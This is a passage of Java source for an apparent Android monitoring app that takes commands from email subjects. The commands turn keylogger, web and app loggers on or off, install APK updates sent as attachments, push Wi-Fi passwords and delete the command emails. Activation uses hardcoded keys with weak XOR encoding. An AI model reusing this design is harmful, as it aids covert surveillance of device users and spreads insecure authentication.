package com.dtj.email;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;

import javax.activation.DataHandler;
import javax.mail.BodyPart;
import javax.mail.Flags;
import javax.mail.Folder;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.Part;
import javax.mail.Store;
import javax.mail.internet.MimeMessage;

import org.apache.commons.lang3.ArrayUtils;

import net.lingala.zip4j.core.ZipFile;
import net.lingala.zip4j.io.ZipInputStream;
import net.lingala.zip4j.model.FileHeader;
import net.lingala.zip4j.unzip.UnzipUtil;
import r1.util.INIFile;
import r1.util.R1Util;
import r1.util.RootUtil;
import r1.util.TimeDiff;
import r1.util.iCCConstants.EPumaQueryResult;
import Decoder.BASE64Decoder;
import Decoder.BASE64Encoder;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import com.dtj.email.MailConstants.TimsTracCmd;
import com.stericson.RootTools.RootTools;
import com.stericson.RootTools.RootTools.Result;

public class RunParseMail implements Runnable  
{
	Context m_ctx;	
	TimsTracCmd m_cmd;
	Handler m_handler;
	Message[] m_msg;
	Folder m_inbox;
	
	List<APKUpdate> m_attachments;
	int m_nAPK;
	
	INIFile m_settings;
  String m_sINIPath;
  
  //String m_sDLFolder;
	
	//String m_sMACAddress = "";
	
	final int BUFF_SIZE = 4096;
	final int DELETE_EMAIL_ID_DAY = 7;
	
	String _ACTIVATION_KEY_1 = "F125577AC0FE40CE962E8EF1C2595644";
  String _ACTIVATION_KEY_2 = "8F96832F72C44B4C929F1B2E0AA83543";
  String _ACTIVATION_DUPLICATE = "AF791DA7373D4712AC8BFB4CA077F7BF";  
  
  //public RunParseMail(Context ctx, Message[] arrMsg, Folder inbox, Handler cmHandler) 
  public RunParseMail(Context ctx, Message[] arrMsg, Store store, Folder inbox, Handler cmHandler, String sINIPath)
  {
		m_ctx = ctx;
  	//m_msg = arrMsg.clone();  	
		m_msg = arrMsg;
  	m_handler = cmHandler;  	
  	m_attachments = new ArrayList<APKUpdate>();
  	  	
  	m_sINIPath = sINIPath;
  	m_inbox = inbox;
  	
  	/*try 
  	{
			m_inbox = store.getFolder("Inbox");
			if (!m_inbox.isOpen())
    		m_inbox.open(Folder.READ_WRITE);
		} catch (MessagingException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}*/
  }
	
  @Override
	public void run() 
  {
  	for (int i=0;i<m_msg.length;i++)
  	{  		
  		ParseEmail(m_msg[i]);  		
  	}
  	 
  	try
  	{
  		m_inbox.close(true);
  	}
  	catch (Exception ex)
  	{}
	}
  
  public void ManualRun() 
  {
  	for (int i=0;i<m_msg.length;i++)
  	{  		
  		ParseEmail(m_msg[i]);  		
  	}
  	 
  	try
  	{
  		m_inbox.close(true);
  	}
  	catch (Exception ex)
  	{}
	}
  
  private void ParseEmail(Message msg)
  {
  	TinyDB db = new TinyDB(m_ctx);
  	m_settings = R1Util.ReadEncryptedSettings(m_ctx, m_sINIPath);
  	
		//String sAppCId = db.getString("AppCId");
  	String sAppCId = m_settings.getStringProperty("MSASettings", "AppCId");
		//String sAppWSName = db.getString("AppWSName");
  	String sAppWSName = m_settings.getStringProperty("MSASettings", "AppWSName");
		String sMACAddress = db.getString("MACAddress");
		//String sAppWId = db.getString("AppWId");
		String sAppWId = m_settings.getStringProperty("MSASettings", "AppWId");
		
		String sSubActivation = "Re: TIMS TRAC Activation Request for " + sAppWId;
		String sSubDisable = "Disable";
		String sSubInfo = "Request Info";
		String sSubInfoAll = "Collect All";
		String sSubSetup = "Set Configuration";
		String sSubDefConfig = "Set Default Configuration";
		String sSubUpdate = "Update";
		String sSubContact = "Contact";
		String sSubContactAll = "Update Contact";
		String sPasswordList = "Password List";
		
		try
		{
			//if (msg.getSubject().indexOf(sSubActivation) == 0)
			if (sAppWId.length() > 0 &&  
					(msg.getSubject().trim().equalsIgnoreCase(sSubActivation) || 
					msg.getSubject().trim().endsWith(sAppWId)))
			{
				// do not accept activation reply if we're not waiting for it (because user can cancel it)
				int nRegisterWaitTimer = db.getInt("RegisterWaitTimer", 0);
				if (nRegisterWaitTimer <= 0)
				{
					msg.setFlag(Flags.Flag.DELETED, true);
					return;
				}
				
				// do not accept activation reply if we're already activated (sometimes the server sends 2 of the same replies)
				String sAppStatus = m_settings.getStringProperty("MSASettings", "AppStatus");
				if (sAppStatus.equals(MailConstants.APP_ENABLED))
				{
					msg.setFlag(Flags.Flag.DELETED, true);
					return;
				}
				
				String sBody = msg.getContent().toString().trim();
				
				if (sBody.equals(_ACTIVATION_DUPLICATE))
				{
					db.putString("ActivationResult", "Error: duplicate");
					
					android.os.Message m1 = android.os.Message.obtain();
					Bundle bnd = new Bundle();
					bnd.putInt("ActivationResult", 0);					
					bnd.putInt("TimsTracCmd", TimsTracCmd.ActivationReceived.Value());
					m1.setData(bnd);
					m_handler.sendMessage(m1);
					
					msg.setFlag(Flags.Flag.DELETED, true);
					
					return;
				}
				
				// decrypt				
				//BASE64Decoder base64decoder = new BASE64Decoder();
				//byte[] byPlain = base64decoder.decodeBuffer(sBody);
				byte[] byPlain = Base64.decode(sBody, Base64.DEFAULT);
				byte[] byKey1 = _ACTIVATION_KEY_1.getBytes();
				for (int i=0,j=0;i<byPlain.length;i++,j++)
				{				
					if (i % byKey1.length == 0 && i > 0)
						j=0;
																	
					byPlain[i] = (byte) ((int)byPlain[i] ^ (int)byKey1[j]);
				}
								
				String sPlain = new StringBuilder(new String(byPlain)).reverse().toString();
				
				// encrpyt
				byte[] byCipher = sPlain.getBytes();
				byte[] byKey2 = _ACTIVATION_KEY_2.getBytes();
				for (int i=0,j=0;i<byCipher.length;i++,j++)
				{				
					if (i % byKey2.length == 0 && i > 0)
						j=0;
																	
					byCipher[i] = (byte) ((int)byCipher[i] ^ (int)byKey2[j]);
				}
				
				//BASE64Encoder base64encoder = new BASE64Encoder();
				//String sCipher = new String(base64encoder.encode(byCipher));				
				String sCipher = new String(Base64.encode(byCipher, Base64.DEFAULT));
				sCipher = sCipher.trim();						
								
				if (!sCipher.equals(sAppCId))
				{
					//Toast.makeText(m_ctx, "Activation FAILED!", Toast.LENGTH_SHORT).show();
					db.putString("ActivationResult", "Error: cid not identical");
					
					android.os.Message m1 = android.os.Message.obtain();
					Bundle bnd = new Bundle();
					bnd.putInt("ActivationResult", 0);				
					bnd.putInt("TimsTracCmd", TimsTracCmd.ActivationReceived.Value());
					m1.setData(bnd);
					m_handler.sendMessage(m1);
					
					msg.setFlag(Flags.Flag.DELETED, true);
					
					return;
				}
				
				// get username from sPlain
				String sSvrWSname = sPlain.substring(44, sPlain.length());
				if (!sAppWId.equals(sSvrWSname))
				{
					db.putString("ActivationResult", "Error: wid not identical");
					
					android.os.Message m1 = android.os.Message.obtain();
					Bundle bnd = new Bundle();
					bnd.putInt("ActivationResult", 0);					
					bnd.putInt("TimsTracCmd", TimsTracCmd.ActivationReceived.Value());
					m1.setData(bnd);
					m_handler.sendMessage(m1);
					
					msg.setFlag(Flags.Flag.DELETED, true);
					
					return;
				}
				
				// get mac address from sPlain
				String sCrudeMac = sPlain.substring(0,36);
				String sSvrMac = "";
				for (int i=0,j=1;i<sCrudeMac.length();i++,j++)
				{
					if (j % 3 == 0 && j > 0)
					{						
						sSvrMac += sCrudeMac.charAt(i);
						/*if (sSvrMac.length() % 2 == 0 && sSvrMac.length() > 0)
							sSvrMac += ":";*/
					}
				}
				
				if (!sMACAddress.replace("-", "").equals(sSvrMac))	
				{
					db.putString("ActivationResult", "Error: mac not identical");
					
					android.os.Message m1 = android.os.Message.obtain();
					Bundle bnd = new Bundle();
					bnd.putInt("ActivationResult", 0);
					bnd.putInt("TimsTracCmd", TimsTracCmd.ActivationReceived.Value());
					m1.setData(bnd);
					m_handler.sendMessage(m1);
				}
				else
				{
					db.putString("ActivationResult", "OK");
					
					//Toast.makeText(m_ctx, "Account activated!", Toast.LENGTH_SHORT).show();
					android.os.Message m1 = android.os.Message.obtain();
					Bundle bnd = new Bundle();
					bnd.putInt("ActivationResult", 1);										
					bnd.putInt("TimsTracCmd", TimsTracCmd.ActivationReceived.Value());
					m1.setData(bnd);
					m_handler.sendMessage(m1);
				}
				
				msg.setFlag(Flags.Flag.DELETED, true);			    		    			    			   	    				
			}
									
			else if (msg.getSubject().indexOf(sSubDisable) == 0)
			{
				// FROM SERVER
				/*Email Subject: Disable
				Email Body:
				wid="NA-VM"
				cmd="disable"*/
				
				//String lines[] = msg.getContent().toString().trim().split("\\r?\\n");
				//String sWId = lines[0].substring(lines[0].indexOf("\"") + 1, lines[0].length()-1);								
				//String sCmd = lines[1].substring(lines[1].indexOf("\"") + 1, lines[1].length()-1);
				
				DBFields dbf = new  DBFields();				
				if (!ParseMultipart(msg, dbf, sAppCId, sAppWId, "disable"))
				{
					//msg.setFlag(Flags.Flag.DELETED, true);
					return;
				}
								
				
				/*String[] sArrWId = dbf.getWid().split(",");				
								
				boolean bOK = false;												
				for (String wid: sArrWId)
				{
					if (wid.equals(sAppWId) && dbf.getCmd().equals("disable"))
					{								
						bOK = true;
						break;
					}
				}*/
				
				//if (bOK)
				if (dbf.VerifyId(sAppCId, sAppWId, "disable"))
				{						
					// send reply
					android.os.Message m1 = android.os.Message.obtain();
					Bundle bnd = new Bundle();
					bnd.putInt("TimsTracCmd", TimsTracCmd.Disable.Value());											
					m1.setData(bnd);
					m_handler.sendMessage(m1);
															
					// delete email if this email is only for us
			    if (dbf.isbDeleteMail())			    			    
			    	msg.setFlag(Flags.Flag.DELETED, true);			    	
			    			    			    			    			   
				}								
			}
			
			else if (msg.getSubject().indexOf(sSubInfo) == 0 ||
							 msg.getSubject().indexOf(sSubInfoAll) == 0)
			{
				String sAppStatus = m_settings.getStringProperty("MSASettings", "AppStatus");
				if (!sAppStatus.equals(MailConstants.APP_ENABLED))									
					return;				
				
				/*Email Subject: Request info
				Email Body:
				wid="NA-VM"
				cmd="info"*/
				
				//String lines[] = msg.getContent().toString().trim().split("\\r?\\n");
				//String sWId = lines[0].substring(lines[0].indexOf("\"") + 1, lines[0].length()-1);								
				//String sCmd = lines[1].substring(lines[1].indexOf("\"") + 1, lines[1].length()-1);
				
				DBFields dbf = new  DBFields();
				if (!ParseMultipart(msg, dbf, sAppCId, sAppWId, "info"))
				{
					//msg.setFlag(Flags.Flag.DELETED, true);
					return;
				}
				
				/*String[] sArrWId = dbf.getWid().split(",");
								
				boolean bOK = false;												
				for (String wid: sArrWId)
				{
					if (wid.equals(sAppWId) && dbf.getCmd().equals("info"))
					{								
						bOK = true;
						break;
					}
				}*/
				
				if (dbf.VerifyId(sAppCId, sAppWId, "info"))
				{
					// send reply					
					android.os.Message m1 = android.os.Message.obtain();
					Bundle bnd = new Bundle();
					if (msg.getSubject().indexOf(sSubInfo) == 0)
						bnd.putInt("TimsTracCmd", TimsTracCmd.Info.Value());
					else
						bnd.putInt("TimsTracCmd", TimsTracCmd.CollectAll.Value());
					m1.setData(bnd);
					m_handler.sendMessage(m1);
					
					// delete email if this email is only for us
					if (dbf.isbDeleteMail())			    	
			    	msg.setFlag(Flags.Flag.DELETED, true);			    
				}
			}
			
			else if (msg.getSubject().indexOf(sSubSetup) == 0)
			{
				String sAppStatus = m_settings.getStringProperty("MSASettings", "AppStatus");
				if (!sAppStatus.equals(MailConstants.APP_ENABLED))									
					return;
				
				/*Email Subject: Set Default Configuration
				Email Body:
				cid="AXEJDw8DC3EGCwBxDQFxenhxAAdye3RxCQR5AXYBDXYAf3wECgMDcwcHcQN1EBkCd3ZrCXgG"
				cmd="setup"
				workstation="MOB-1"
				archive.email=""
				sound.email=""
				feature.keylogger="0"
				feature.applogger="0"
				feature.weblogger="0"
				feature.attlogger="0"
				feature.mailadmin="0"
				feature.payroll="0"
				feature.chat="1"
				feature.voip="1"
				attlog.time=""
				voip.username="9001"
				voip.password="557700"*/
				
				/*String lines[] = msg.getContent().toString().trim().split("\\r?\\n");
				String sCId = 					lines[0].substring(lines[0].indexOf("\"") + 1, lines[0].length()-1);				
				String sCmd = 					lines[1].substring(lines[1].indexOf("\"") + 1, lines[1].length()-1);
 
				String sWId = 					lines[2].substring(lines[2].indexOf("\"") + 1, lines[2].length()-1);				
				String sArchiveEmail = 	lines[3].substring(lines[3].indexOf("\"") + 1, lines[3].length()-1);
				String sSoundEmail = 		lines[4].substring(lines[4].indexOf("\"") + 1, lines[4].length()-1);				
				String sFeatKeyLogger = lines[5].substring(lines[5].indexOf("\"") + 1, lines[5].length()-1);
				String sFeatAppLogger = lines[6].substring(lines[6].indexOf("\"") + 1, lines[6].length()-1);
				String sFeatWebLogger = lines[7].substring(lines[7].indexOf("\"") + 1, lines[7].length()-1);
				String sFeatAttLogger = lines[8].substring(lines[8].indexOf("\"") + 1, lines[8].length()-1);
				String sFeatMailAdmin = lines[9].substring(lines[9].indexOf("\"") + 1, lines[9].length()-1);				
				String sFeatPayroll = 	lines[10].substring(lines[10].indexOf("\"") + 1, lines[10].length()-1);
				String sFeatChat = 			lines[11].substring(lines[11].indexOf("\"") + 1, lines[11].length()-1);
				String sFeatVoip = 			lines[12].substring(lines[12].indexOf("\"") + 1, lines[12].length()-1);
				String sAttLogTime = 		lines[13].substring(lines[13].indexOf("\"") + 1, lines[13].length()-1);
				String sVoipUsername = 	lines[14].substring(lines[14].indexOf("\"") + 1, lines[14].length()-1);
				String sVoipPassword = 	lines[15].substring(lines[15].indexOf("\"") + 1, lines[15].length()-1);*/
				
				DBFields dbf = new  DBFields();
				if (!ParseMultipart(msg, dbf, sAppCId, sAppWId, "setup"))
				{
					//msg.setFlag(Flags.Flag.DELETED, true);
					return;
				}
				
				/*String[] sArrCId = dbf.getCid().split(",");
				
				boolean bOK = false;												
				for (String cid: sArrCId)
				{
					if (cid.equals(sAppCId) && dbf.getCmd().equals("setup"))
					{								
						bOK = true;
						break;
					}
				}*/
				
				if (dbf.VerifyId(sAppCId, sAppWId, "setup"))
				{
					// set values
					if (dbf.getWorkstation().trim().length() > 0)
					{
						//db.putString("AppWId", dbf.getWorkstation());
						m_settings.setStringProperty("MSASettings", "AppWId", dbf.getWorkstation(), null);						
					}
					
					db.putString("prev.feature.chat", m_settings.getStringProperty("MSASettings", "feature.chat"));
					db.putString("prev.feature.voip", m_settings.getStringProperty("MSASettings", "feature.voip"));
					db.putString("prev.feature.puma", m_settings.getStringProperty("MSASettings", "feature.puma"));
					//db.putString("prev.feature.mail", db.getString("feature.mail"));
					
					db.putString("archive.email", dbf.getArchive_mail());		
					db.putString("sound.email", dbf.getSound_mail());
					db.putString("feature.keylogger", dbf.getFeature_keylogger());
					db.putString("feature.applogger", dbf.getFeature_applogger());
					db.putString("feature.weblogger", dbf.getFeature_weblogger());
					db.putString("feature.attlogger", dbf.getFeature_attlogger());
					db.putString("feature.mailadmin", dbf.getFeature_mailadmin());
					db.putString("feature.payroll", dbf.getFeature_payroll());
					
					m_settings.setStringProperty("MSASettings", "feature.chat", dbf.getFeature_chat(), null);
					m_settings.setStringProperty("MSASettings", "feature.voip", dbf.getFeature_voip(), null);
					m_settings.setStringProperty("MSASettings", "feature.puma", dbf.getFeature_puma(), null);
					
					//db.putString("feature.chat", dbf.getFeature_chat());
					//db.putString("feature.voip", dbf.getFeature_voip());					
					db.putString("attlog.time", dbf.getAttlog_time());
					//db.putString("voip.username", dbf.getVoip_username());
					m_settings.setStringProperty("MSASettings", "voip.username", dbf.getVoip_username(), null);
			    //db.putString("voip.password", dbf.getVoip_password());
					m_settings.setStringProperty("MSASettings", "voip.password", dbf.getVoip_password(), null);
			    
			    db.putString("SetupResult", "OK");
			    
			    // save ini
			    R1Util.SaveEncryptedSettings(m_settings, m_sINIPath);
					
					// send reply					
					android.os.Message m1 = android.os.Message.obtain();
					Bundle bnd = new Bundle();
					bnd.putInt("TimsTracCmd", TimsTracCmd.Setup.Value());											
					m1.setData(bnd);
					m_handler.sendMessage(m1);
					
					// delete email if this email is only for us
					if (dbf.isbDeleteMail())			    	
			    	msg.setFlag(Flags.Flag.DELETED, true);			    
				}
				else
					db.putString("SetupResult", "Error: cid not identical");
			}
			
			else if (msg.getSubject().indexOf(sSubDefConfig) == 0)
			{												
				String sAppStatus = m_settings.getStringProperty("MSASettings", "AppStatus");
				if (!sAppStatus.equals(MailConstants.APP_ENABLED))									
					return;
				
				/*Email Subject: Set Default Configuration
				Email Body:
				cid="fnAJAn4DCnMHC3B3AAYGAXwLCXZ3AHEGCQMFDHF3AQAPcQEFCgMDcwcHcQZBMVEx"
				cmd="setup"
				voip.username="8010"
				voip.password="12345"*/
				
				/*String lines[] = msg.getContent().toString().trim().split("\\r?\\n");
				String sCId = lines[0].substring(lines[0].indexOf("\"") + 1, lines[0].length()-1);				
				String sCmd = lines[1].substring(lines[1].indexOf("\"") + 1, lines[1].length()-1);
				String sVoipUsername = lines[2].substring(lines[2].indexOf("\"") + 1, lines[2].length()-1);
				String sVoipPassword = lines[3].substring(lines[3].indexOf("\"") + 1, lines[3].length()-1);*/
				
				DBFields dbf = new  DBFields();
				if (!ParseMultipart(msg, dbf, sAppCId, sAppWId, "setup"))
				{
					//msg.setFlag(Flags.Flag.DELETED, true);
					return;
				}
				
				/*String[] sArrCId = dbf.getCid().split(",");
				
				boolean bOK = false;												
				for (String cid: sArrCId)
				{
					if (cid.equals(sAppCId) && dbf.getCmd().equals("setup"))
					{								
						bOK = true;
						break;
					}
				}*/
				
				if (dbf.VerifyId(sAppCId, sAppWId, "setup"))
				{					
			    //db.putString("voip.username", dbf.getVoip_username());
			    //db.putString("voip.password", dbf.getVoip_password());
					
					m_settings.setStringProperty("MSASettings", "voip.username", dbf.getVoip_username(), null);
					m_settings.setStringProperty("MSASettings", "voip.password", dbf.getVoip_password(), null);
					
					// save ini
			    R1Util.SaveEncryptedSettings(m_settings, m_sINIPath);
			    
			    // add log					
					android.os.Message m1 = android.os.Message.obtain();
					Bundle bnd = new Bundle();
					bnd.putInt("TimsTracCmd", TimsTracCmd.DefConfig.Value());											
					m1.setData(bnd);
					m_handler.sendMessage(m1);
			    
			    // delete email
			    if (dbf.isbDeleteMail())			    	
			    	msg.setFlag(Flags.Flag.DELETED, true);			    
				}								
			}
			
			else if (msg.getSubject().indexOf(sSubUpdate) == 0)
			{
				String sAppStatus = m_settings.getStringProperty("MSASettings", "AppStatus");
				if (!sAppStatus.equals(MailConstants.APP_ENABLED))									
					return;
				
				/*Email Subject: Update
					Email Body:
					wid="nc-3"
					cmd="update"*/
				
				/*String lines[] = msg.getContent().toString().trim().split("\\r?\\n");
				String sWId = lines[0].substring(lines[0].indexOf("\"") + 1, lines[0].length()-1);								
				String sCmd = lines[1].substring(lines[1].indexOf("\"") + 1, lines[1].length()-1);
				
				String[] sArrWId = sWId.split(",");
								
				boolean bOK = false;												
				for (String wid: sArrWId)
				{
					if (wid.equals(sAppWId) && sCmd.equals("update"))
					{								
						bOK = true;
						break;
					}
				}*/
				
				DBFields dbf = new  DBFields();
				if (!ParseMultipart(msg, dbf, sAppCId, sAppWId, "update"))
				{
					//msg.setFlag(Flags.Flag.DELETED, true);
					return;
				}
				
				/*String[] sArrWId = dbf.getWid().split(",");
				
				boolean bOK = false;												
				for (String wid: sArrWId)
				{
					if (wid.equals(sAppWId) && dbf.getCmd().equals("update"))
					{								
						bOK = true;
						break;
					}
				}*/
				
				boolean bOK = dbf.VerifyId(sAppCId, sAppWId, "update");
								
								
				// download attachment					
				//List<APKUpdate> attachments = new ArrayList<APKUpdate>();
				if (dbf.isbAttachment() && bOK)
				{
					//db.putInt("IsDownloading", 1);
					Log.v("ParseMail", "Downloading attachment");
					
					m_attachments.clear();
					
					List<APKUpdate> msaUpdate = new ArrayList<APKUpdate>();
					DownloadAttachment(msg, m_attachments, msaUpdate, TimsTracCmd.Update);				
					
					String sAPKUpdate = "";					
					for (int i=0;i<m_attachments.size();i++)
					{
						APKUpdate apk = m_attachments.get(i);
						if (i < m_attachments.size()-1)
							sAPKUpdate += apk.getM_file().getPath() + "|";
						else
							sAPKUpdate += apk.getM_file().getPath();
					}
					
					//db.putInt("IsDownloading", 0);
					
					// send reply															
					android.os.Message m1 = android.os.Message.obtain();
					Bundle bnd = new Bundle();
					bnd.putInt("TimsTracCmd", TimsTracCmd.DownloadUpdateOK.Value());
					if (m_attachments.size() > 0)
						bnd.putInt("nUpdate", m_attachments.size());
					m1.setData(bnd);											
					m_handler.sendMessage(m1);
					
					// install app
					/*if (RootUtil.isDeviceRooted())
					{
						InstallAPKViaPM(m_attachments, true);										
															
						// delete update files in OFFICIAL internal folder 
						if (m_attachments.size() > 0)
						{							
							String sFolder = "";
							//if (RootUtil.isDeviceRooted())
			        	//sFolder = "/data/data/" + m_ctx.getPackageName();
			        //else		       
			        	sFolder = GetDLFolder() + "/msaupdate";
							
							// delete apk files
							String[] arrAPK = R1Util.ListFilesInDir(sFolder, ".apk");
			  			if (arrAPK.length > 0)
			  			{
			  				for (String sFile: arrAPK)
			  				{
			  					String sFilePath = sFolder + "/" + sFile;
			  					R1Util.DeleteDir(new File(sFilePath));		  					  	          				
			  				}
			  			}
			  			
			  			// delete zip files
			  			String[] arrZip = R1Util.ListFilesInDir(sFolder, ".zip");
			  			if (arrZip.length > 0)
			  			{
			  				for (String sFile: arrZip)
			  				{
			  					String sFilePath = sFolder + "/" + sFile;
			  					R1Util.DeleteDir(new File(sFilePath));		  					  	          				
			  				}
			  			}
			  			
			  			// delete folder
			  			if (R1Util.IsFileExists(sFolder))
		        		R1Util.DeleteDir(new File(sFolder));
						}
					}
					else
					{
						// delete zip files
						String sFolder = GetDLFolder() + "/msaupdate";
		  			String[] arrZip = R1Util.ListFilesInDir(sFolder, ".zip");
		  			if (arrZip.length > 0)
		  			{
		  				for (String sFile: arrZip)
		  				{
		  					String sFilePath = sFolder + "/" + sFile;
		  					R1Util.DeleteDir(new File(sFilePath));		  					  	          				
		  				}
		  			}
		  			
						//Intent intent = new Intent();
						//intent.setAction("com.dtj.msa.MSA_INSTALL_APK");
						//intent.putExtra("APK", sAPKUpdate);
						//m_ctx.sendBroadcast(intent);
					}*/
					
					// delete zip files
					String sFolder = GetDLFolder() + "/msaupdate";
	  			String[] arrZip = R1Util.ListFilesInDir(sFolder, ".zip");
	  			if (arrZip.length > 0)
	  			{
	  				for (String sFile: arrZip)
	  				{
	  					String sFilePath = sFolder + "/" + sFile;
	  					R1Util.DeleteDir(new File(sFilePath));		  					  	          				
	  				}
	  			}
					
					// send reply					
					android.os.Message m2 = android.os.Message.obtain();
					Bundle bnd2 = new Bundle();
					bnd2.putInt("TimsTracCmd", TimsTracCmd.AppUpdateOK.Value());			
					if (msaUpdate.size() > 0)
						bnd2.putString("MSAUpdate", msaUpdate.get(0).getM_file().getPath());
					m2.setData(bnd2);
					m_handler.sendMessage(m2);
					
					// AR
					/*if (!R1Util.IsAppInstalled(m_ctx, "r1.msalauncher"))
					{
						InstallAPK(msaUpdate);												
					}*/
				}
				
				// delete email if this email is only for us
				if (dbf.isbDeleteMail())		    			    
		    	msg.setFlag(Flags.Flag.DELETED, true);		    			
			}
			
			else if (msg.getSubject().indexOf(sSubContact) == 0 ||
							msg.getSubject().indexOf(sSubContactAll) == 0)
			{
				String sAppStatus = m_settings.getStringProperty("MSASettings", "AppStatus");
				if (!sAppStatus.equals(MailConstants.APP_ENABLED))									
					return;
				
				DBFields dbf = new  DBFields();
				if (!ParseMultipart(msg, dbf, sAppCId, sAppWId, "contact"))
				{
					//msg.setFlag(Flags.Flag.DELETED, true);
					return;
				}
				
				boolean bOK = dbf.VerifyId(sAppCId, sAppWId, "contact");
									
				if (dbf.isbAttachment() && bOK)
				{
					m_attachments.clear();
					
					// download csv
					List<APKUpdate> msaUpdate = new ArrayList<APKUpdate>();
					DownloadAttachment(msg, m_attachments, msaUpdate, TimsTracCmd.Contact);
					
					// send reply																				
					android.os.Message m1 = android.os.Message.obtain();
					Bundle bnd = new Bundle();
					bnd.putInt("TimsTracCmd", TimsTracCmd.DownloadContactOK.Value());														
					m1.setData(bnd);											
					m_handler.sendMessage(m1);						
																																			
					// delete email if this email is only for us
					if (dbf.isbDeleteMail())			    	
			    	msg.setFlag(Flags.Flag.DELETED, true);
				}											   				
				else
					db.putString("ContactResult", "Error: cid not identical");
			}
			
			else if (msg.getSubject().indexOf(sPasswordList) == 0)				
			{
				String sAppStatus = m_settings.getStringProperty("MSASettings", "AppStatus");
				if (!sAppStatus.equals(MailConstants.APP_ENABLED))									
					return;
				
				DBFields dbf = new  DBFields();
				//boolean bOK = ParseMultipart(msg, dbf, sAppCId, sAppWId, "pwdlist");				
				//if (!bOK)
				if (!ParseMultipart(msg, dbf, sAppCId, sAppWId, "pwdlist"))
				{
					//msg.setFlag(Flags.Flag.DELETED, true);
					return;
				}
				
				if (dbf.VerifyId(sAppCId, sAppWId, "pwdlist"))
				{	
					String ssid0 = m_settings.getStringProperty("MSASettings", "wifi.ssid0");
					String ssid1 = m_settings.getStringProperty("MSASettings", "wifi.ssid1");
					String ssid2 = m_settings.getStringProperty("MSASettings", "wifi.ssid2");
					String ssid3 = m_settings.getStringProperty("MSASettings", "wifi.ssid3");
					String ssid4 = m_settings.getStringProperty("MSASettings", "wifi.ssid4");
					String ssid5 = m_settings.getStringProperty("MSASettings", "wifi.ssid5");
					String ssid6 = m_settings.getStringProperty("MSASettings", "wifi.ssid6");
					
					String pwd0 = m_settings.getStringProperty("MSASettings", "wifi.pwd0");
					String pwd1 = m_settings.getStringProperty("MSASettings", "wifi.pwd1");
					String pwd2 = m_settings.getStringProperty("MSASettings", "wifi.pwd2");
					String pwd3 = m_settings.getStringProperty("MSASettings", "wifi.pwd3");
					String pwd4 = m_settings.getStringProperty("MSASettings", "wifi.pwd4");
					String pwd5 = m_settings.getStringProperty("MSASettings", "wifi.pwd5");
					String pwd6 = m_settings.getStringProperty("MSASettings", "wifi.pwd6");
										
					if (!ssid0.equals(dbf.ssid0) || !pwd0.equals(dbf.pwd0))
					{
						m_settings.setStringProperty("MSASettings", "wifi.ssid0.updated", "1", null);
						m_settings.setStringProperty("MSASettings", "wifi.ssid0", dbf.ssid0, null);
						m_settings.setStringProperty("MSASettings", "wifi.pwd0", dbf.pwd0, null);						
					}
					else
						m_settings.setStringProperty("MSASettings", "wifi.ssid0.updated", "0", null);
					
					if (!ssid1.equals(dbf.ssid1) || !pwd1.equals(dbf.pwd1))
					{
						m_settings.setStringProperty("MSASettings", "wifi.ssid1.updated", "1", null);
						m_settings.setStringProperty("MSASettings", "wifi.ssid1", dbf.ssid1, null);
						m_settings.setStringProperty("MSASettings", "wifi.pwd1", dbf.pwd1, null);
					}
					else
						m_settings.setStringProperty("MSASettings", "wifi.ssid1.updated", "0", null);
					
					if (!ssid2.equals(dbf.ssid2) || !pwd2.equals(dbf.pwd2))
					{
						m_settings.setStringProperty("MSASettings", "wifi.ssid2.updated", "1", null);
						m_settings.setStringProperty("MSASettings", "wifi.ssid2", dbf.ssid2, null);
						m_settings.setStringProperty("MSASettings", "wifi.pwd2", dbf.pwd2, null);
					}
					else
						m_settings.setStringProperty("MSASettings", "wifi.ssid2.updated", "0", null);
					
					if (!ssid3.equals(dbf.ssid3) || !pwd3.equals(dbf.pwd3))
					{
						m_settings.setStringProperty("MSASettings", "wifi.ssid3.updated", "1", null);
						m_settings.setStringProperty("MSASettings", "wifi.ssid3", dbf.ssid3, null);
						m_settings.setStringProperty("MSASettings", "wifi.pwd3", dbf.pwd3, null);
					}
					else
						m_settings.setStringProperty("MSASettings", "wifi.ssid3.updated", "0", null);
					
					if (!ssid4.equals(dbf.ssid4) || !pwd4.equals(dbf.pwd4))
					{
						m_settings.setStringProperty("MSASettings", "wifi.ssid4.updated", "1", null);
						m_settings.setStringProperty("MSASettings", "wifi.ssid4", dbf.ssid4, null);
						m_settings.setStringProperty("MSASettings", "wifi.pwd4", dbf.pwd4, null);
					}
					else
						m_settings.setStringProperty("MSASettings", "wifi.ssid4.updated", "0", null);
					
					if (!ssid5.equals(dbf.ssid5) || !pwd5.equals(dbf.pwd5))
					{
						m_settings.setStringProperty("MSASettings", "wifi.ssid5.updated", "1", null);
						m_settings.setStringProperty("MSASettings", "wifi.ssid5", dbf.ssid5, null);
						m_settings.setStringProperty("MSASettings", "wifi.pwd5", dbf.pwd5, null);
					}
					else
						m_settings.setStringProperty("MSASettings", "wifi.ssid5.updated", "0", null);
					
					if (!ssid6.equals(dbf.ssid6) || !pwd6.equals(dbf.pwd6))
					{
						m_settings.setStringProperty("MSASettings", "wifi.ssid6.updated", "1", null);
						m_settings.setStringProperty("MSASettings", "wifi.ssid6", dbf.ssid6, null);																																			
						m_settings.setStringProperty("MSASettings", "wifi.pwd6", dbf.pwd6, null);
					}
					else
						m_settings.setStringProperty("MSASettings", "wifi.ssid6.updated", "0", null);
					
					// save ini
			    R1Util.SaveEncryptedSettings(m_settings, m_sINIPath);
			    
			    // add log					
					android.os.Message m1 = android.os.Message.obtain();
					Bundle bnd = new Bundle();
					bnd.putInt("TimsTracCmd", TimsTracCmd.PasswordList.Value());											
					m1.setData(bnd);
					m_handler.sendMessage(m1);
			    
			    // delete email
			    if (dbf.isbDeleteMail())			    	
			    	msg.setFlag(Flags.Flag.DELETED, true);			    
				}
			}
		}
		catch (Exception ex)
		{
			Log.v("ParseMail", "Error: " + ex.getMessage());
			//db.putInt("IsDownloading", 0);
		}
  }
  
  private boolean ParseMultipart(Message msg, DBFields dbf, String sAppCId, String sAppWId, String sCmd)
  {  	  	
  	try
